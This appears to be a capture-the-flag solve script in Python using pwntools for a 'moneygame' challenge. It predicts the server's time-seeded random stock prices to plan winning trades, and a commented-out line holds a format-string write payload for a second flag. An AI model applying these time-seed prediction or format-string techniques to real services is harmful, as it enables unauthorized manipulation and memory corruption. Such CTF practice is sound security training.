"""
Strategy:

Calculate all of the peaks and valleys for each stock. 
Sort the peaks by highest value.
Assign actions in order of most valuable peaks.

If while assigning an action is already taken, cut the profits there to preserve the higher pay.
"""
from pwn import *
from collections import defaultdict
import time
from ctypes import CDLL
from math import floor

libc = CDLL('libc-2.19.so')

counter = 0 

def set_stocks():
    '''Create stocks based on current srand'''
    for index in xrange(1, 4):
        stocks[index].append(10000)

    for _ in xrange(54):
        for index in xrange(1, 4):
            curr_stock = stocks[index][-1]

            curr_stock += libc.rand() % 2001 - 1000
            if curr_stock <= 4999:
                curr_stock = 5000
            if curr_stock > 15000:
                curr_stock = 15000

            stocks[index].append(curr_stock)

def get_peaks(nums):
    '''Determine the Peaks and Valleys in a given list of numbers
    
    Returns:
        list of tuples containing:
            'Peak'
            Index of start of Peak
            Index of end of Peak
            Amount gained

    >>> print get_peaks([0, 2, 3, 4, 2, 1, 5, 9, 2])
    [('Peak', 0, 3, 4), ('Peak', 5, 8, 1)]
    '''
    start = nums[0]
    points = [('start', start, 0)]

    looking_for = ''

    curr = start

    for index,num in enumerate(nums[1:]):
        if not looking_for:
            if num < curr:
                looking_for = 'Valley'
            else:
                looking_for = 'Peak'

        if index == (len(nums)-2):
            last_value_index = points[-1][2]
            last_value = abs(nums[last_value_index]-num)
            points.append((looking_for, last_value_index, index+1, last_value))

        elif looking_for == 'Valley':
            if num > curr:
                last_value_index = points[-1][2]
                last_value = abs(nums[last_value_index]-curr)
                points.append(('Valley', last_value_index, index, last_value))
                looking_for = 'Peak'

        elif looking_for == 'Peak':
            if num < curr:
                last_value_index = points[-1][2]
                last_value = abs(nums[last_value_index]-curr)
                points.append(('Peak', last_value_index, index, last_value))
                looking_for = 'Valley'

        curr = num

    peaks = [item for item in points if item[0] == 'Peak']
    return peaks

def send_action(action):
    '''Given a tuple action, send it to the server'''
    print r.readuntil('$')
    cash = r.readuntil('!')[:-1]
    r.readuntil('#1: $')
    stock1 = r.readuntil(' (').split()[0]
    r.readuntil('#2: $')
    stock2 = r.readuntil(' (').split()[0]
    r.readuntil('#3: $')
    stock3 = r.readuntil(' (').split()[0]

    log.info("Cash: {}".format(cash))
    log.info("Stock 1: {}".format(stock1))
    log.info("Stock 2: {}".format(stock2))
    log.info("Stock 3: {}".format(stock3))

    log.info("Action: {}".format(action))
    command, stock = action
    r.sendline(command)
    if command == 'Rest':
        # r.sendline(stock)
        return

    r.clean()
    r.sendline(stock)
    sleep(0.1)
    print r.recvuntil('-')
    print r.recvuntil('-')
    max_num = r.recvuntil(')')[:-1]
    log.info("Max number: {}".format(max_num))
    r.clean()
    r.sendline(max_num)

def check_win():
    '''Before interacting with the server, simulate if we can win in order to save time'''
    money = 10000
    for index, action in enumerate(final):
        action, stock = action
        if stock == '0':
            continue
        stock = {'1': stock1,
                 '2': stock2,
                 '3': stock3}[stock]
        
        if action == "Buy":
            stock_price = stock[index] * 0.01
            number_of_stocks = int(money / stock_price)

            money -= (number_of_stocks * stock_price)
        if action == "Sell":
            stock_price = stock[index] * 0.01
            money += (number_of_stocks * stock_price)

        print action, money, number_of_stocks

    if money > 99999:
        return True
    else:
        return False

while True:
    """
    Loop until the random number generator is in our favor
    """
    r = remote('pwn1.chal.mmactf.link', 21345)
    # r = process('./moneygame-patched')

    # Seed srand with time(0)
    now = int(floor(time.time()))
    libc.srand(now)

    # Initializers
    stocks = defaultdict(list)
    moves = []

    # Initialize stocks from known seeded random
    set_stocks()

    # Grab our 3 stock lists
    stock1 = stocks[1] 
    stock2 = stocks[2]
    stock3 = stocks[3]

    # Grab the largest profits (Peaks) from each stock set
    peaks = [list(item) + ['1'] for item in get_peaks(stock1)]
    peaks += [list(item) + ['2'] for item in get_peaks(stock2)]
    peaks += [list(item) + ['3'] for item in get_peaks(stock3)]

    # Order all profits from the three stocks by potential profit
    peaks = sorted(peaks, key=lambda x: x[3])[::-1]

    actions = [''] * 54
    # print actions

    """
    From the profits list, we will try and fill in all available actions.
    Starting from the most profitable peaks, attempt to block time off for that stock.
    If lower profit range overlaps an existing higher profit range, cut the lower profit range short.

    i.e.
    [4, 6, 100, '1'], [7, 9, 80, '3'], [1, 5, 50, '2']

    [4, 6, 100, '1']
    Actions: ['', '', '', '', 'Buy stock1', 'Rest', 'Sell stock1', '', '', '']

    [7, 9, 80, '3']
    Actions: ['', '', '', '', 'Buy stock1', 'Rest', 'Sell stock1', 'Buy stock3', 'Rest', 'Sell stock3']

    [1, 5, 50, '2']
    # Note: 1 - 5 overlaps into existing 4 - 6, Try to go as far as we can before selling.
    Actions: ['', 'Buy stock2', 'Rest', 'Sell stock2', 'Buy stock1', 'Rest', 'Sell stock1', 'Buy stock3', 'Rest', 'Sell stock3']
    """
    for peak in peaks:
        _, start, stop, _, stock_num = peak
        # Action already happening on this day, don't overwrite it
        # Also, don't try to start anything with only one empty slot
        if actions[start] or actions[start+1]:
            continue

        actions[start] = ('Buy', str(stock_num))

        for index in xrange(start+1, stop+1):
            try:
                if actions[index]:
                    actions[index-1] = ('Sell', str(stock_num))
                    break
                else:
                    actions[index] = ('Rest', str(stock_num))
            except IndexError:
                pass
        else:
            # We were not interrupted and need to sale these stocks
            try:
                actions[stop] = ('Sell', str(stock_num))
            except IndexError:
                actions[stop-1] = ('Sell', str(stock_num))


    final = []
    for action in actions:
        if not action:
            final.append(('Rest', '0'))
            continue
        final.append(action)

    stocks = defaultdict(list)

    # Don't continue unless we know we can win
    if not check_win():
        r.close()
        sleep(1)
        continue

    try:
        for move in final:
            send_action(move)
    except Exception as e:
        pass

    # Name - Flag 1
    r.sendline('pwned')
    # Name - Flag 2
    # shellcode = p32(0x804a2b8) + '%46c%7$hhn'
    # r.sendline(shellcode)
    r.interactive()
    r.close()
